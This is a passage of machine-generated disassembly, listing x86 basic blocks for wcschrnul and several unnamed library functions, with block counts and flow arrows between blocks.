0xb0972d8:	mov	edi, dword ptr [esi + eax*4]
0xb0972db:	test	edi, edi
0xb0972dd:	jne	0xb0972a0
None
|
|
|
v
0xb0972a8:	mov	edi, dword ptr [esi + ecx*4 + 0xc]
0xb0972ac:	test	edi, edi
0xb0972ae:	je	0xb0972e0
None
|
|
|
v
0xb09729a:	xor	ecx, ecx
0xb09729c:	jmp	0xb0972d8
None
|
|
|
v
0xb097270:	push	edi
0xb097271:	push	esi
0xb097272:	mov	edx, dword ptr [esp + 0x10]
0xb097276:	mov	esi, dword ptr [esp + 0xc]
0xb09727a:	test	edx, edx
0xb09727c:	je	0xb0972ed
None
|
|
|
v
0xb0972e0:	pop	esi
0xb0972e1:	pop	edi
0xb0972e2:	ret	
None
|
|
|
v
0xb09727e:	mov	ecx, dword ptr [esi]
0xb097280:	test	ecx, ecx
0xb097282:	je	0xb0972ed
None
|
|
|
v
0xb0972e8:	mov	eax, edi
0xb0972ea:	pop	esi
0xb0972eb:	pop	edi
0xb0972ec:	ret	
None
|
|
|
v
0xb0972ce:	cmp	edx, 2
0xb0972d1:	lea	eax, dword ptr [ecx + 6]
0xb0972d4:	je	0xb0972e0
None
|
|
|
v
0xb097289:	mov	eax, dword ptr [esi + 4]
0xb09728c:	test	eax, eax
0xb09728e:	je	0xb0972f2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:wcschrnul
TOTAL BLOCKS :7
0xb097322:	add	eax, 4
0xb097325:	mov	edx, dword ptr [eax]
0xb097327:	test	edx, edx
0xb097329:	jne	0xb097318
None
|
|
|
v
0xb097312:	jmp	0xb09732d
None
|
|
|
v
0xb097300:	mov	eax, dword ptr [esp + 4]
0xb097304:	mov	ecx, dword ptr [esp + 8]
0xb097308:	mov	edx, dword ptr [eax]
0xb09730a:	test	edx, edx
0xb09730c:	je	0xb09732b
None
|
|
|
v
0xb09732b:	ret	
None
|
|
|
v
0xb09732d:	lea	esi, dword ptr [esi]
0xb097330:	ret	
None
|
|
|
v
0xb09730e:	cmp	edx, ecx
0xb097310:	jne	0xb097322
None
|
|
|
v
0xb097318:	cmp	edx, ecx
0xb09731a:	lea	esi, dword ptr [esi]
0xb097320:	je	0xb09732b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a3c40
TOTAL BLOCKS :8
0xb0a3c7d:	mov	eax, dword ptr [ebp - 0xc]
0xb0a3c80:	call	0xb01c390
None
|
|
|
v
0xb0a3c85:	xor	eax, eax
0xb0a3c87:	mov	ebx, dword ptr [ebp - 4]
0xb0a3c8a:	leave	
0xb0a3c8b:	ret	
None
|
|
|
v
0xb0a3c6e:	sub	esp, 8
0xb0a3c71:	test	eax, eax
0xb0a3c73:	jne	0xb0a3ca0
None
|
|
|
v
0xb0a3ca0:	xor	eax, eax
0xb0a3ca2:	mov	ebx, dword ptr [ebp - 4]
0xb0a3ca5:	leave	
0xb0a3ca6:	ret	
None
|
|
|
v
0xb0a3c75:	mov	edx, dword ptr [ebp - 0x10]
0xb0a3c78:	cmp	edx, 1
0xb0a3c7b:	jbe	0xb0a3c90
None
|
|
|
v
0xb0a3c40:	push	ebp
0xb0a3c41:	mov	ebp, esp
0xb0a3c43:	push	ebx
0xb0a3c44:	call	0xb1267db
None
|
|
|
v
0xb0a3c49:	add	ebx, 0x1073b7
0xb0a3c4f:	sub	esp, 0x24
0xb0a3c52:	mov	edx, dword ptr [ebp + 0xc]
0xb0a3c55:	lea	eax, dword ptr [ebp - 0x10]
0xb0a3c58:	mov	dword ptr [esp], eax
0xb0a3c5b:	mov	eax, dword ptr [ebp + 8]
0xb0a3c5e:	lea	ecx, dword ptr [ebp - 0xc]
0xb0a3c61:	mov	dword ptr [esp + 4], 0
0xb0a3c69:	call	0xb01c160
None
|
|
|
v
0xb0a3c90:	mov	eax, dword ptr [ebp + 0x10]
0xb0a3c93:	mov	ebx, dword ptr [ebp - 4]
0xb0a3c96:	mov	dword ptr [eax], edx
0xb0a3c98:	mov	eax, dword ptr [ebp - 0xc]
0xb0a3c9b:	leave	
0xb0a3c9c:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a3cb0
TOTAL BLOCKS :34
0xb0a3e13:	lea	esp, dword ptr [ebp - 0xc]
0xb0a3e16:	pop	ebx
0xb0a3e17:	pop	esi
0xb0a3e18:	pop	edi
0xb0a3e19:	pop	ebp
0xb0a3e1a:	ret	
None
|
|
|
v
0xb0a3d65:	mov	edi, dword ptr [ebx - 0xf84]
0xb0a3d6b:	nop	
0xb0a3d6c:	lea	esi, dword ptr [esi]
0xb0a3d70:	mov	ecx, dword ptr [edi + ecx*4]
0xb0a3d73:	add	eax, 1
0xb0a3d76:	add	edx, 1
0xb0a3d79:	mov	byte ptr [eax - 1], cl
0xb0a3d7c:	movsx	ecx, byte ptr [edx]
0xb0a3d7f:	test	cl, cl
0xb0a3d81:	jne	0xb0a3d70
None
|
|
|
v
0xb0a3ddc:	mov	esi, dword ptr [ebp - 0x20]
0xb0a3ddf:	lea	eax, dword ptr [ebx - 0x107410]
0xb0a3de5:	mov	edi, dword ptr [ebp - 0x1c]
0xb0a3de8:	mov	dword ptr [esi + 0x10], eax
0xb0a3deb:	mov	dword ptr [esi + 0x14], edi
0xb0a3dee:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0a3df4:	test	eax, eax
0xb0a3df6:	je	0xb0a3e13
None
|
|
|
v
0xb0a3dba:	mov	edi, dword ptr [ebp - 0x1c]
0xb0a3dbd:	mov	dword ptr [esp + 4], esi
0xb0a3dc1:	mov	eax, edi
0xb0a3dc3:	add	eax, 0xc
0xb0a3dc6:	mov	dword ptr [esp + 8], eax
0xb0a3dca:	mov	eax, dword ptr [ebp - 0x28]
0xb0a3dcd:	mov	dword ptr [esp], eax
0xb0a3dd0:	call	0xb0a3c40
None
|
|
|
v
0xb0a3d02:	mov	eax, dword ptr [edi + 0x1c]
0xb0a3d05:	mov	edx, dword ptr [edi + 0x5c]
0xb0a3d08:	cmp	eax, 1
0xb0a3d0b:	sbb	edi, edi
0xb0a3d0d:	and	edi, 0xfffffff8
0xb0a3d10:	add	edi, 0xb
0xb0a3d13:	cmp	eax, 1
0xb0a3d16:	mov	dword ptr [ebp - 0x2c], eax
0xb0a3d19:	sbb	eax, eax
0xb0a3d1b:	xor	esi, esi
0xb0a3d1d:	mov	dword ptr [ebp - 0x24], eax
0xb0a3d20:	mov	eax, edx
0xb0a3d22:	not	dword ptr [ebp - 0x24]
0xb0a3d25:	and	dword ptr [ebp - 0x24], 8
0xb0a3d29:	jmp	0xb0a3d3e
None
|
|
|
v
0xb0a3cf7:	test	eax, eax
0xb0a3cf9:	mov	dword ptr [ebp - 0x1c], eax
0xb0a3cfc:	je	0xb0a3e5c
None
|
|
|
v
0xb0a3df8:	lea	edx, dword ptr [ebx + 0xfe0]
0xb0a3dfe:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0a3e04:	mov	dword ptr [esp], edx
0xb0a3e07:	ror	eax, 9
0xb0a3e0a:	xor	eax, dword ptr gs:[0x18]
0xb0a3e11:	call	eax
None
|
|
|
v
0xb0a3ce3:	mov	dword ptr [esp + 4], 0x10
0xb0a3ceb:	mov	dword ptr [esp], 1
0xb0a3cf2:	call	0xb017450
None
|
|
|
v
0xb0a3e80:	test	esi, esi
0xb0a3e82:	mov	byte ptr [eax], 0x2f
0xb0a3e85:	jne	0xb0a3ec8
None
|
|
|
v
0xb0a3d8c:	mov	edi, dword ptr [ebp - 0x1c]
0xb0a3d8f:	lea	esi, dword ptr [ebx - 0x4af55]
0xb0a3d95:	mov	byte ptr [eax], 0
0xb0a3d98:	mov	dword ptr [esp], esi
0xb0a3d9b:	mov	eax, edi
0xb0a3d9d:	add	eax, 4
0xb0a3da0:	mov	dword ptr [esp + 8], eax
0xb0a3da4:	mov	eax, dword ptr [ebp - 0x28]
0xb0a3da7:	mov	dword ptr [esp + 4], eax
0xb0a3dab:	call	0xb0a3c40
None
|
|
|
v
0xb0a3ec0:	jmp	0xb0a3d8c
None
|
|
|
v
0xb0a3e5c:	mov	esi, dword ptr [ebp - 0x20]
0xb0a3e5f:	lea	eax, dword ptr [ebx - 0x178c]
0xb0a3e65:	mov	dword ptr [esi + 0x14], eax
0xb0a3e68:	jmp	0xb0a3dee
None
|
|
|
v
0xb0a3d3e:	movzx	ecx, byte ptr [eax]
0xb0a3d41:	test	cl, cl
0xb0a3d43:	jne	0xb0a3d30
None
|
|
|
v
0xb0a3cbb:	add	ebx, 0x107345
0xb0a3cc1:	sub	esp, 0x2c
0xb0a3cc4:	mov	dword ptr [ebp - 0x20], eax
0xb0a3cc7:	mov	edi, dword ptr [ebx + 0x38d8]
0xb0a3ccd:	test	edi, edi
0xb0a3ccf:	jne	0xb0a3e20
None
|
|
|
v
0xb0a3dee:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0a3df4:	test	eax, eax
0xb0a3df6:	je	0xb0a3e13
None
|
|
|
v
0xb0a3ed0:	mov	eax, dword ptr [ebp - 0x28]
0xb0a3ed3:	jmp	0xb0a3d83
None
|
|
|
v
0xb0a3e99:	mov	edx, dword ptr [ebp - 0x2c]
0xb0a3e9c:	lea	ecx, dword ptr [ebx - 0x4aa73]
0xb0a3ea2:	mov	esi, dword ptr [ebp - 0x24]
0xb0a3ea5:	mov	dword ptr [esp], eax
0xb0a3ea8:	test	edx, edx
0xb0a3eaa:	lea	edx, dword ptr [ebx - 0x49200]
0xb0a3eb0:	cmove	edx, ecx
0xb0a3eb3:	mov	dword ptr [esp + 8], esi
0xb0a3eb7:	mov	dword ptr [esp + 4], edx
0xb0a3ebb:	call	0xb07cad0
None
|
|
|
v
0xb0a3ec8:	add	eax, 1
0xb0a3ecb:	jmp	0xb0a3d8c
None
|
|
|
v
0xb0a3d30:	add	eax, 1
0xb0a3d33:	cmp	cl, 0x2f
0xb0a3d36:	sete	cl
0xb0a3d39:	movzx	ecx, cl
0xb0a3d3c:	add	esi, ecx
0xb0a3d3e:	movzx	ecx, byte ptr [eax]
0xb0a3d41:	test	cl, cl
0xb0a3d43:	jne	0xb0a3d30
None
|
|
|
v
0xb0a3e70:	mov	eax, dword ptr [ebp - 0x1c]
0xb0a3e73:	mov	eax, dword ptr [eax + 8]
0xb0a3e76:	jmp	0xb0a3dd8
None
|
|
|
v
0xb0a3e40:	mov	esi, dword ptr [ebp - 0x1c]
0xb0a3e43:	mov	eax, dword ptr [esi]
0xb0a3e45:	test	eax, eax
0xb0a3e47:	je	0xb0a3e51
None
|
|
|
v
0xb0a3d70:	mov	ecx, dword ptr [edi + ecx*4]
0xb0a3d73:	add	eax, 1
0xb0a3d76:	add	edx, 1
0xb0a3d79:	mov	byte ptr [eax - 1], cl
0xb0a3d7c:	movsx	ecx, byte ptr [edx]
0xb0a3d7f:	test	cl, cl
0xb0a3d81:	jne	0xb0a3d70
None
|
|
|
v
0xb0a3dd5:	mov	dword ptr [edi + 8], eax
0xb0a3dd8:	test	eax, eax
0xb0a3dda:	je	0xb0a3e40
None
|
|
|
v
0xb0a3cd5:	mov	edi, dword ptr [ebp - 0x20]
0xb0a3cd8:	mov	esi, dword ptr [edi + 0x14]
0xb0a3cdb:	test	esi, esi
0xb0a3cdd:	jne	0xb0a3dee
None
|
|
|
v
0xb0a3db0:	test	eax, eax
0xb0a3db2:	mov	dword ptr [edi], eax
0xb0a3db4:	je	0xb0a3e70
None
|
|
|
v
0xb0a3e49:	mov	edx, dword ptr [esi + 4]
0xb0a3e4c:	call	0xb01c390
None
|
|
|
v
0xb0a3e20:	lea	edx, dword ptr [ebx + 0xfe0]
0xb0a3e26:	mov	eax, dword ptr [ebx + 0x38a4]
0xb0a3e2c:	mov	dword ptr [esp], edx
0xb0a3e2f:	ror	eax, 9
0xb0a3e32:	xor	eax, dword ptr gs:[0x18]
0xb0a3e39:	call	eax
None
|
|
|
v
0xb0a3e87:	mov	ecx, dword ptr [ebp - 0x24]
0xb0a3e8a:	add	eax, 2
0xb0a3e8d:	mov	byte ptr [eax - 1], 0x2f
0xb0a3e91:	test	ecx, ecx
0xb0a3e93:	je	0xb0a3d8c
None
|
|
|
v
0xb0a3dd8:	test	eax, eax
0xb0a3dda:	je	0xb0a3e40
None
|
|
|
v
0xb0a3d83:	cmp	esi, 1
0xb0a3d86:	jbe	0xb0a3e80
None
|
|
|
v
0xb0a3d45:	sub	eax, edx
0xb0a3d47:	movsx	ecx, byte ptr [edx]
0xb0a3d4a:	lea	eax, dword ptr [edi + eax + 0x1e]
0xb0a3d4e:	and	eax, 0xfffffff0
0xb0a3d51:	sub	esp, eax
0xb0a3d53:	lea	eax, dword ptr [esp + 0x1b]
0xb0a3d57:	and	eax, 0xfffffff0
0xb0a3d5a:	test	cl, cl
0xb0a3d5c:	mov	dword ptr [ebp - 0x28], eax
0xb0a3d5f:	je	0xb0a3ed0
None
|
|
|
v
0xb0a3e3b:	jmp	0xb0a3cd5
None
|
|
|
v
0xb0a3cb0:	push	ebp
0xb0a3cb1:	mov	ebp, esp
0xb0a3cb3:	push	edi
0xb0a3cb4:	push	esi
0xb0a3cb5:	push	ebx
0xb0a3cb6:	call	0xb1267db
None
|
|
|
v
0xb0a3e51:	mov	eax, dword ptr [ebp - 0x1c]
0xb0a3e54:	mov	dword ptr [esp], eax
0xb0a3e57:	call	0xb017470
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a3ee0
TOTAL BLOCKS :11
0xb0a3f44:	mov	eax, edi
0xb0a3f46:	call	0xb0a3cb0
None
|
|
|
v
0xb0a3f4b:	mov	edx, dword ptr [edi + 0x14]
0xb0a3f4e:	jmp	0xb0a3f09
None
|
|
|
v
0xb0a3f50:	lea	edx, dword ptr [ebx - 0x178c]
0xb0a3f56:	jmp	0xb0a3f09
None
|
|
|
v
0xb0a3f25:	add	dword ptr [eax + 8], 1
0xb0a3f29:	mov	eax, dword ptr [esi + 8]
0xb0a3f2c:	mov	edx, dword ptr [eax]
0xb0a3f2e:	test	edx, edx
0xb0a3f30:	je	0xb0a3f36
None
|
|
|
v
0xb0a3f09:	mov	eax, dword ptr [edx]
0xb0a3f0b:	mov	dword ptr [esi], eax
0xb0a3f0d:	mov	ecx, dword ptr [edx + 4]
0xb0a3f10:	mov	dword ptr [esi + 4], ecx
0xb0a3f13:	mov	ecx, dword ptr [edx + 8]
0xb0a3f16:	mov	dword ptr [esi + 8], ecx
0xb0a3f19:	mov	ecx, dword ptr [eax]
0xb0a3f1b:	mov	edx, dword ptr [edx + 0xc]
0xb0a3f1e:	test	ecx, ecx
0xb0a3f20:	mov	dword ptr [esi + 0xc], edx
0xb0a3f23:	je	0xb0a3f29
None
|
|
|
v
0xb0a3f29:	mov	eax, dword ptr [esi + 8]
0xb0a3f2c:	mov	edx, dword ptr [eax]
0xb0a3f2e:	test	edx, edx
0xb0a3f30:	je	0xb0a3f36
None
|
|
|
v
0xb0a3ee0:	push	edi
0xb0a3ee1:	mov	edx, dword ptr gs:[0]
0xb0a3ee8:	push	esi
0xb0a3ee9:	mov	esi, eax
0xb0a3eeb:	push	ebx
0xb0a3eec:	call	0xb1267db
None
|
|
|
v
0xb0a3f36:	pop	ebx
0xb0a3f37:	pop	esi
0xb0a3f38:	pop	edi
0xb0a3f39:	ret	
None
|
|
|
v
0xb0a3ef1:	add	ebx, 0x10710f
0xb0a3ef7:	mov	eax, dword ptr [ebx - 0x134]
0xb0a3efd:	mov	eax, dword ptr [edx + eax]
0xb0a3f00:	mov	edi, dword ptr [eax]
0xb0a3f02:	mov	edx, dword ptr [edi + 0x14]
0xb0a3f05:	test	edx, edx
0xb0a3f07:	je	0xb0a3f3a
None
|
|
|
v
0xb0a3f3a:	lea	eax, dword ptr [ebx - 0x1320]
0xb0a3f40:	cmp	edi, eax
0xb0a3f42:	je	0xb0a3f50
None
|
|
|
v
0xb0a3f32:	add	dword ptr [eax + 8], 1
0xb0a3f36:	pop	ebx
0xb0a3f37:	pop	esi
0xb0a3f38:	pop	edi
0xb0a3f39:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a3f60
TOTAL BLOCKS :9
0xb0a3fb3:	add	esp, 0x1c
0xb0a3fb6:	pop	ebx
0xb0a3fb7:	pop	esi
0xb0a3fb8:	pop	edi
0xb0a3fb9:	pop	ebp
0xb0a3fba:	ret	
None
|
|
|
v
0xb0a3f6d:	add	ebx, 0x107093
0xb0a3f73:	sub	esp, 0x1c
0xb0a3f76:	lea	eax, dword ptr [eax + 4]
0xb0a3f79:	mov	dword ptr [esp + 8], eax
0xb0a3f7d:	mov	dword ptr [esp + 4], edx
0xb0a3f81:	lea	ebp, dword ptr [ebx - 0x4af55]
0xb0a3f87:	mov	dword ptr [esp], ebp
0xb0a3f8a:	call	0xb0a3c40
None
|
|
|
v
0xb0a3fd0:	mov	edx, dword ptr [esi + 4]
0xb0a3fd3:	mov	eax, dword ptr [esi]
0xb0a3fd5:	call	0xb01c390
None
|
|
|
v
0xb0a3f60:	push	ebp
0xb0a3f61:	push	edi
0xb0a3f62:	mov	edi, edx
0xb0a3f64:	push	esi
0xb0a3f65:	mov	esi, eax
0xb0a3f67:	push	ebx
0xb0a3f68:	call	0xb1267db
None
|
|
|
v
0xb0a3fa8:	mov	edx, eax
0xb0a3faa:	mov	dword ptr [esi + 8], eax
0xb0a3fad:	xor	eax, eax
0xb0a3faf:	test	edx, edx
0xb0a3fb1:	je	0xb0a3fd0
None
|
|
|
v
0xb0a3fc0:	add	esp, 0x1c
0xb0a3fc3:	mov	eax, 1
0xb0a3fc8:	pop	ebx
0xb0a3fc9:	pop	esi
0xb0a3fca:	pop	edi
0xb0a3fcb:	pop	ebp
0xb0a3fcc:	ret	
None
|
|
|
v
0xb0a3f8f:	test	eax, eax
0xb0a3f91:	mov	dword ptr [esi], eax
0xb0a3f93:	je	0xb0a3fc0
None
|
|
|
v
0xb0a3fda:	mov	eax, 1
0xb0a3fdf:	jmp	0xb0a3fb3
None
|
|
|
v
0xb0a3f95:	lea	eax, dword ptr [esi + 0xc]
0xb0a3f98:	mov	dword ptr [esp + 8], eax
0xb0a3f9c:	mov	dword ptr [esp + 4], ebp
0xb0a3fa0:	mov	dword ptr [esp], edi
0xb0a3fa3:	call	0xb0a3c40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a3ff0
TOTAL BLOCKS :51
0xb0a4308:	test	ecx, ecx
0xb0a430a:	setne	cl
0xb0a430d:	test	eax, eax
0xb0a430f:	mov	edi, ecx
0xb0a4311:	setne	cl
0xb0a4314:	cmp	eax, 4
0xb0a4317:	mov	ebp, ecx
0xb0a4319:	setne	cl
0xb0a431c:	jmp	0xb0a41c6
None
|
|
|
v
0xb0a43cb:	lea	eax, dword ptr [ebx - 0x491e9]
0xb0a43d1:	mov	dword ptr [esp + 0xc], eax
0xb0a43d5:	lea	eax, dword ptr [ebx - 0x491f7]
0xb0a43db:	mov	dword ptr [esp + 4], eax
0xb0a43df:	lea	eax, dword ptr [ebx - 0x442bc]
0xb0a43e5:	mov	dword ptr [esp + 8], 0x9e
0xb0a43ed:	mov	dword ptr [esp], eax
0xb0a43f0:	call	0xb027820
None
|
|
|
v
0xb0a4321:	mov	ecx, 1
0xb0a4326:	mov	ebp, 1
0xb0a432b:	mov	eax, 5
0xb0a4330:	xor	esi, esi
0xb0a4332:	jmp	0xb0a41cc
None
|
|
|
v
0xb0a43bf:	mov	eax, edi
0xb0a43c1:	call	0xb0a3cb0
None
|
|
|
v
0xb0a41fd:	and	eax, 0xfffffffd
0xb0a4200:	cmp	eax, 5
0xb0a4203:	je	0xb0a41dd
None
|
|
|
v
0xb0a4015:	add	ebx, 0x106feb
0xb0a401b:	mov	dword ptr [esp + 0x68], 0
0xb0a4023:	mov	dword ptr [esp + 0x70], eax
0xb0a4027:	mov	eax, dword ptr [esp + 0x1b0]
0xb0a402e:	mov	dword ptr [esp + 0x6c], 1
0xb0a4036:	mov	dword ptr [esp + 0x64], 1
0xb0a403e:	mov	edi, dword ptr [eax]
0xb0a4040:	mov	ebp, dword ptr [edi + 0x14]
0xb0a4043:	test	ebp, ebp
0xb0a4045:	je	0xb0a43b5
None
|
|
|
v
0xb0a42e5:	mov	edx, dword ptr [esp + 0x5c]
0xb0a42e9:	mov	ecx, edx
0xb0a42eb:	sub	ecx, ebp
0xb0a42ed:	sar	ecx, 2
0xb0a42f0:	add	esi, ecx
0xb0a42f2:	cmp	eax, 5
0xb0a42f5:	je	0xb0a4298
None
|
|
|
v
0xb0a43b5:	lea	eax, dword ptr [ebx - 0x1320]
0xb0a43bb:	cmp	edi, eax
0xb0a43bd:	je	0xb0a43f5
None
|
|
|
v
0xb0a4195:	test	ebp, ebp
0xb0a4197:	je	0xb0a4361
None
|
|
|
v
0xb0a42a4:	mov	eax, dword ptr [esp + 0x30]
0xb0a42a8:	mov	dword ptr [esp + 0x1c], 1
0xb0a42b0:	mov	dword ptr [esp + 0x18], 0
0xb0a42b8:	mov	dword ptr [esp + 0x10], 0
0xb0a42c0:	mov	dword ptr [esp + 0x14], eax
0xb0a42c4:	mov	eax, dword ptr [esp + 0x3c]
0xb0a42c8:	mov	dword ptr [esp + 0xc], eax
0xb0a42cc:	mov	eax, dword ptr [esp + 0x38]
0xb0a42d0:	mov	dword ptr [esp + 8], eax
0xb0a42d4:	mov	eax, dword ptr [esp + 0x34]
0xb0a42d8:	mov	dword ptr [esp + 4], eax
0xb0a42dc:	mov	eax, dword ptr [esp + 0x2c]
0xb0a42e0:	mov	dword ptr [esp], eax
0xb0a42e3:	call	edi
None
|
|
|
v
0xb0a43c6:	jmp	0xb0a404b
None
|
|
|
v
0xb0a4155:	mov	ebp, dword ptr [esp + 0x5c]
0xb0a4159:	mov	ecx, edx
0xb0a415b:	mov	esi, dword ptr [esp + 0x80]
0xb0a4162:	jmp	0xb0a416a
None
|
|
|
v
0xb0a4168:	mov	esi, edx
0xb0a416a:	sub	ebp, dword ptr [esp + 0x1a0]
0xb0a4171:	mov	edi, dword ptr [esp + 0x1a4]
0xb0a4178:	sar	ebp, 2
0xb0a417b:	test	eax, 0xfffffffb
0xb0a4180:	mov	dword ptr [edi], esi
0xb0a4182:	mov	esi, ebp
0xb0a4184:	jne	0xb0a41f0
None
|
|
|
v
0xb0a42fe:	mov	ebp, dword ptr [edx - 4]
0xb0a4301:	test	ebp, ebp
0xb0a4303:	jne	0xb0a4337
None
|
|
|
v
0xb0a40c0:	mov	edx, dword ptr [esp + 0x80]
0xb0a40c7:	mov	ebp, dword ptr [esp + 0x5c]
0xb0a40cb:	cmp	edx, esi
0xb0a40cd:	jne	0xb0a4168
None
|
|
|
v
0xb0a41ab:	mov	edi, dword ptr [esp + 0x1a4]
0xb0a41b2:	sub	esi, 1
0xb0a41b5:	mov	dword ptr [edi], 0
0xb0a41bb:	test	eax, eax
0xb0a41bd:	setne	dl
0xb0a41c0:	mov	edi, edx
0xb0a41c2:	mov	ebp, edx
0xb0a41c4:	and	edi, ecx
0xb0a41c6:	mov	edx, edi
0xb0a41c8:	test	dl, dl
0xb0a41ca:	je	0xb0a41fd
None
|
|
|
v
0xb0a405d:	ror	edi, 9
0xb0a4060:	xor	edi, dword ptr gs:[0x18]
0xb0a4067:	mov	edx, dword ptr [esp + 0x1a0]
0xb0a406e:	mov	eax, dword ptr [esp + 0x1a4]
0xb0a4075:	test	edx, edx
0xb0a4077:	je	0xb0a4238
None
|
|
|
v
0xb0a4205:	mov	eax, ebp
0xb0a4207:	test	al, al
0xb0a4209:	je	0xb0a41dd
None
|
|
|
v
0xb0a41bb:	test	eax, eax
0xb0a41bd:	setne	dl
0xb0a41c0:	mov	edi, edx
0xb0a41c2:	mov	ebp, edx
0xb0a41c4:	and	edi, ecx
0xb0a41c6:	mov	edx, edi
0xb0a41c8:	test	dl, dl
0xb0a41ca:	je	0xb0a41fd
None
|
|
|
v
0xb0a407d:	mov	ebp, dword ptr [eax]
0xb0a407f:	test	esi, esi
0xb0a4081:	mov	eax, dword ptr [esp + 0x1a0]
0xb0a4088:	mov	dword ptr [esp + 0x80], ebp
0xb0a408f:	mov	dword ptr [esp + 0x5c], eax
0xb0a4093:	lea	eax, dword ptr [eax + esi*4]
0xb0a4096:	mov	dword ptr [esp + 0x60], eax
0xb0a409a:	je	0xb0a4321
None
|
|
|
v
0xb0a4361:	lea	eax, dword ptr [ebx - 0x491e9]
0xb0a4367:	mov	dword ptr [esp + 0xc], eax
0xb0a436b:	lea	eax, dword ptr [ebx - 0x491f7]
0xb0a4371:	mov	dword ptr [esp + 4], eax
0xb0a4375:	lea	eax, dword ptr [ebx - 0x492da]
0xb0a437b:	mov	dword ptr [esp + 8], 0x92
0xb0a4383:	mov	dword ptr [esp], eax
0xb0a4386:	call	0xb027820
None
|
|
|
v
0xb0a4067:	mov	edx, dword ptr [esp + 0x1a0]
0xb0a406e:	mov	eax, dword ptr [esp + 0x1a4]
0xb0a4075:	test	edx, edx
0xb0a4077:	je	0xb0a4238
None
|
|
|
v
0xb0a4186:	mov	edi, dword ptr [esp + 0x1a0]
0xb0a418d:	mov	edi, dword ptr [edi + ebp*4 - 4]
0xb0a4191:	test	edi, edi
0xb0a4193:	jne	0xb0a41bb
None
|
|
|
v
0xb0a416a:	sub	ebp, dword ptr [esp + 0x1a0]
0xb0a4171:	mov	edi, dword ptr [esp + 0x1a4]
0xb0a4178:	sar	ebp, 2
0xb0a417b:	test	eax, 0xfffffffb
0xb0a4180:	mov	dword ptr [edi], esi
0xb0a4182:	mov	esi, ebp
0xb0a4184:	jne	0xb0a41f0
None
|
|
|
v
0xb0a41cc:	lea	edi, dword ptr [eax - 6]
0xb0a41cf:	cmp	edi, 1
0xb0a41d2:	jbe	0xb0a41fd
None
|
|
|
v
0xb0a4104:	mov	eax, dword ptr [esp + 0x30]
0xb0a4108:	mov	dword ptr [esp + 0x1c], 1
0xb0a4110:	mov	dword ptr [esp + 0x18], 0
0xb0a4118:	mov	dword ptr [esp + 0x10], 0
0xb0a4120:	mov	dword ptr [esp + 0x14], eax
0xb0a4124:	mov	eax, dword ptr [esp + 0x38]
0xb0a4128:	mov	dword ptr [esp + 0xc], esi
0xb0a412c:	mov	dword ptr [esp + 8], eax
0xb0a4130:	mov	eax, dword ptr [esp + 0x34]
0xb0a4134:	mov	dword ptr [esp + 4], eax
0xb0a4138:	mov	eax, dword ptr [esp + 0x2c]
0xb0a413c:	mov	dword ptr [esp], eax
0xb0a413f:	call	edi
None
|
|
|
v
0xb0a438b:	lea	eax, dword ptr [ebx - 0x491e9]
0xb0a4391:	mov	dword ptr [esp + 0xc], eax
0xb0a4395:	lea	eax, dword ptr [ebx - 0x491f7]
0xb0a439b:	mov	dword ptr [esp + 4], eax
0xb0a439f:	lea	eax, dword ptr [ebx - 0x4421c]
0xb0a43a5:	mov	dword ptr [esp + 8], 0x93
0xb0a43ad:	mov	dword ptr [esp], eax
0xb0a43b0:	call	0xb027820
None
|
|
|
v
0xb0a420b:	test	cl, cl
0xb0a420d:	je	0xb0a41dd
None
|
|
|
v
0xb0a4337:	lea	eax, dword ptr [ebx - 0x491e9]
0xb0a433d:	mov	dword ptr [esp + 0xc], eax
0xb0a4341:	lea	eax, dword ptr [ebx - 0x491f7]
0xb0a4347:	mov	dword ptr [esp + 4], eax
0xb0a434b:	lea	eax, dword ptr [ebx - 0x44148]
0xb0a4351:	mov	dword ptr [esp + 8], 0x63
0xb0a4359:	mov	dword ptr [esp], eax
0xb0a435c:	call	0xb027820
None
|
|
|
v
0xb0a41c6:	mov	edx, edi
0xb0a41c8:	test	dl, dl
0xb0a41ca:	je	0xb0a41fd
None
|
|
|
v
0xb0a43f5:	lea	eax, dword ptr [ebx - 0x178c]
0xb0a43fb:	jmp	0xb0a404e
None
|
|
|
v
0xb0a4246:	lea	ecx, dword ptr [esp + 0x180]
0xb0a424d:	lea	ebp, dword ptr [esi + eax + 1]
0xb0a4251:	mov	eax, dword ptr [esp + 0x70]
0xb0a4255:	xor	esi, esi
0xb0a4257:	mov	dword ptr [esp + 0x3c], ebp
0xb0a425b:	mov	edx, dword ptr [eax + 4]
0xb0a425e:	mov	eax, dword ptr [eax]
0xb0a4260:	mov	dword ptr [esp + 0x60], ecx
0xb0a4264:	lea	ecx, dword ptr [esp + 0x4c]
0xb0a4268:	mov	dword ptr [esp + 0x30], ecx
0xb0a426c:	lea	ecx, dword ptr [esp + 0x50]
0xb0a4270:	mov	dword ptr [esp + 0x38], ecx
0xb0a4274:	lea	ecx, dword ptr [esp + 0x5c]
0xb0a4278:	mov	dword ptr [esp + 0x54], eax
0xb0a427c:	lea	eax, dword ptr [esp + 0x54]
0xb0a4280:	mov	dword ptr [esp + 0x70], eax
0xb0a4284:	lea	eax, dword ptr [esp + 0x80]
0xb0a428b:	mov	dword ptr [esp + 0x58], edx
0xb0a428f:	mov	ebp, eax
0xb0a4291:	mov	dword ptr [esp + 0x34], ecx
0xb0a4295:	lea	esi, dword ptr [esi]
0xb0a4298:	mov	dword ptr [esp], edi
0xb0a429b:	mov	dword ptr [esp + 0x5c], ebp
0xb0a429f:	call	0xb123900
None
|
|
|
v
0xb0a4238:	mov	esi, dword ptr [eax]
0xb0a423a:	mov	dword ptr [esp], esi
0xb0a423d:	mov	dword ptr [esp + 0x50], esi
0xb0a4241:	call	0xb07ae80
None
|
|
|
v
0xb0a420f:	mov	eax, dword ptr [ebx - 0xdc]
0xb0a4215:	mov	esi, 0xffffffff
0xb0a421a:	mov	edx, dword ptr gs:[0]
